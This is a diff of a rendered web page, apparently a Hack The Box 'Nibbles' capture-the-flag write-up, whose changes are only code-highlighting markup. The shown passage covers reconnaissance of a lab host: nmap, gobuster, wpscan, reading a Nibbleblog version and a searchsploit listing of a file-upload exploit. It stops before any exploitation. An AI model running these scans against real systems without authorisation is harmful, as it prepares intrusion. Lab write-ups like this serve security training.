@@ -199,319 +199,319 @@
 
       <div class="post-content">
         <h1 id="nmap">nmap</h1>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#6272a4"># Nmap 7.80 scan initiated Sat Sep 19 13:21:01 2020 as: nmap -sC -sV -oA nmap/nibbles -Pn 10.10.10.75</span>
-Nmap scan report <span style="color:#ff79c6">for</span> 10.10.10.75
-Host is up <span style="color:#ff79c6">(</span>0.047s latency<span style="color:#ff79c6">)</span>.
-Not shown: <span style="color:#bd93f9">998</span> closed ports
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span style="color:#ff79c6">(</span>Ubuntu Linux; protocol 2.0<span style="color:#ff79c6">)</span>
-| ssh-hostkey:
-|   <span style="color:#bd93f9">2048</span> c4:f8:ad:e8:f8:04:77🇩🇪cf:15:0d:63:0a:18:7e:49 <span style="color:#ff79c6">(</span>RSA<span style="color:#ff79c6">)</span>
-|   <span style="color:#bd93f9">256</span> 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 <span style="color:#ff79c6">(</span>ECDSA<span style="color:#ff79c6">)</span>
-|_  <span style="color:#bd93f9">256</span> e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 <span style="color:#ff79c6">(</span>ED25519<span style="color:#ff79c6">)</span>
-80/tcp open  http    Apache httpd 2.4.18 <span style="color:#ff79c6">((</span>Ubuntu<span style="color:#ff79c6">))</span>
-|_http-server-header: Apache/2.4.18 <span style="color:#ff79c6">(</span>Ubuntu<span style="color:#ff79c6">)</span>
-|_http-title: Site doesn&#39;t have a title <span style="color:#ff79c6">(</span>text/html<span style="color:#ff79c6">)</span>.
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-<span style="color:#6272a4"># Nmap done at Sat Sep 19 13:21:11 2020 -- 1 IP address (1 host up) scanned in 9.58 seconds</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#6272a4"># Nmap 7.80 scan initiated Sat Sep 19 13:21:01 2020 as: nmap -sC -sV -oA nmap/nibbles -Pn 10.10.10.75</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#ff79c6">for</span> 10.10.10.75
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#ff79c6">(</span>0.047s latency<span style="color:#ff79c6">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#bd93f9">998</span> closed ports
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span style="color:#ff79c6">(</span>Ubuntu Linux; protocol 2.0<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey:
+</span></span><span style="display:flex;"><span>|   <span style="color:#bd93f9">2048</span> c4:f8:ad:e8:f8:04:77🇩🇪cf:15:0d:63:0a:18:7e:49 <span style="color:#ff79c6">(</span>RSA<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#bd93f9">256</span> 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 <span style="color:#ff79c6">(</span>ECDSA<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#bd93f9">256</span> e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 <span style="color:#ff79c6">(</span>ED25519<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.18 <span style="color:#ff79c6">((</span>Ubuntu<span style="color:#ff79c6">))</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.18 <span style="color:#ff79c6">(</span>Ubuntu<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Site doesn&#39;t have a title <span style="color:#ff79c6">(</span>text/html<span style="color:#ff79c6">)</span>.
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Nmap done at Sat Sep 19 13:21:11 2020 -- 1 IP address (1 host up) scanned in 9.58 seconds</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h1 id="gobuster">gobuster</h1>
 <p>Nothing sweet with gobuster</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@014202efa8c8:~/htb/nibbles$ gobuster dir -u http://10.10.10.75 -w /opt/dictionaries/common.txt -o gobuster.log
-/.hta <span style="color:#ff79c6">(</span>Status: 403<span style="color:#ff79c6">)</span>
-/.htaccess <span style="color:#ff79c6">(</span>Status: 403<span style="color:#ff79c6">)</span>
-/.htpasswd <span style="color:#ff79c6">(</span>Status: 403<span style="color:#ff79c6">)</span>
-/index.html <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span>
-/server-status <span style="color:#ff79c6">(</span>Status: 403<span style="color:#ff79c6">)</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ctf@014202efa8c8:~/htb/nibbles$ gobuster dir -u http://10.10.10.75 -w /opt/dictionaries/common.txt -o gobuster.log
+</span></span><span style="display:flex;"><span>/.hta <span style="color:#ff79c6">(</span>Status: 403<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>/.htaccess <span style="color:#ff79c6">(</span>Status: 403<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>/.htpasswd <span style="color:#ff79c6">(</span>Status: 403<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>/index.html <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>/server-status <span style="color:#ff79c6">(</span>Status: 403<span style="color:#ff79c6">)</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>But index.html contains interesting comments</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@014202efa8c8:~/htb/nibbles$ curl -s http://10.10.10.75/index.html
-&lt;b&gt;Hello world!&lt;/b&gt;
-...
-&lt;!-- /nibbleblog/ directory. Nothing interesting here! --&gt;
-</code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ctf@014202efa8c8:~/htb/nibbles$ curl -s http://10.10.10.75/index.html
+</span></span><span style="display:flex;"><span>&lt;b&gt;Hello world!&lt;/b&gt;
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>&lt;!-- /nibbleblog/ directory. Nothing interesting here! --&gt;
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Not a wordpress blog</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&gt;wpscan --url http://10.10.10.75/nibbleblog/ -e u,p
-...
-Scan Aborted: The remote website is up, but does not seem to be running WordPress.
-</code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt;wpscan --url http://10.10.10.75/nibbleblog/ -e u,p
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>Scan Aborted: The remote website is up, but does not seem to be running WordPress.
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>A bit more gobuster</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@014202efa8c8:~/htb/nibbles$ gobuster dir -t <span style="color:#bd93f9">40</span> -u http://10.10.10.75/nibbleblog -w /opt/dictionaries/common.txt -o gobuster.log
-...
-/README <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span>
-/admin.php <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span>
-/index.php <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ctf@014202efa8c8:~/htb/nibbles$ gobuster dir -t <span style="color:#bd93f9">40</span> -u http://10.10.10.75/nibbleblog -w /opt/dictionaries/common.txt -o gobuster.log
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>/README <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>/admin.php <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>/index.php <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>We find few version information</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ff79c6">======</span> <span style="color:#8be9fd;font-style:italic">Nibbleblog</span> <span style="color:#ff79c6">======</span>
-Version: v4.0.3
-<span style="color:#ff79c6">[</span>...<span style="color:#ff79c6">]</span>
-<span style="color:#ff79c6">=====</span> System <span style="color:#8be9fd;font-style:italic">Requirements</span> <span style="color:#ff79c6">=====</span>
-* PHP v5.2 or <span style="color:#8be9fd;font-style:italic">higher</span>
-<span style="color:#ff79c6">=====</span> Installation <span style="color:#8be9fd;font-style:italic">guide</span> <span style="color:#ff79c6">=====</span>
-1- Download the last version from http://nibbleblog.com
-</code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff79c6">======</span> <span style="color:#8be9fd;font-style:italic">Nibbleblog</span> <span style="color:#ff79c6">======</span>
+</span></span><span style="display:flex;"><span>Version: v4.0.3
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>...<span style="color:#ff79c6">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">=====</span> System <span style="color:#8be9fd;font-style:italic">Requirements</span> <span style="color:#ff79c6">=====</span>
+</span></span><span style="display:flex;"><span>* PHP v5.2 or <span style="color:#8be9fd;font-style:italic">higher</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">=====</span> Installation <span style="color:#8be9fd;font-style:italic">guide</span> <span style="color:#ff79c6">=====</span>
+</span></span><span style="display:flex;"><span>1- Download the last version from http://nibbleblog.com
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Searchsploit</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@014202efa8c8:~/htb/nibbles$ searchsploit nibble
--------------------------------------------------------------------------- ---------------------------------
- Exploit Title                                                            |  Path
--------------------------------------------------------------------------- ---------------------------------
-Nibbleblog <span style="color:#bd93f9">3</span> - Multiple SQL Injections                                    | php/webapps/35865.txt
-Nibbleblog 4.0.3 - Arbitrary File Upload <span style="color:#ff79c6">(</span>Metasploit<span style="color:#ff79c6">)</span>                     | php/remote/38489.rb
--------------------------------------------------------------------------- ---------------------------------
-</code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ctf@014202efa8c8:~/htb/nibbles$ searchsploit nibble
+</span></span><span style="display:flex;"><span>-------------------------------------------------------------------------- ---------------------------------
+</span></span><span style="display:flex;"><span> Exploit Title                                                            |  Path
+</span></span><span style="display:flex;"><span>-------------------------------------------------------------------------- ---------------------------------
+</span></span><span style="display:flex;"><span>Nibbleblog <span style="color:#bd93f9">3</span> - Multiple SQL Injections                                    | php/webapps/35865.txt
+</span></span><span style="display:flex;"><span>Nibbleblog 4.0.3 - Arbitrary File Upload <span style="color:#ff79c6">(</span>Metasploit<span style="color:#ff79c6">)</span>                     | php/remote/38489.rb
+</span></span><span style="display:flex;"><span>-------------------------------------------------------------------------- ---------------------------------
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>There is a metasploit exploit, but it requires user and password :/</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
